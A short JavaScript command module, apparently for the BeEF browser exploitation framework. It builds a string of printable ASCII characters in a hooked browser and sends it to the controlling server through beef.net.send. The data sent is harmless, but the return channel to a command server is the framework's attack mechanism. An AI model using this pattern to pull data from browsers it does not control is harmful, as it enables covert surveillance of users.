beef.execute(function() {

    var str = '';
    for (var i=32; i<=127;i++) str += String.fromCharCode(i);

    console.log(str);
    beef.net.send("<%= @command_url %>", <%= @command_id %>, str);

});

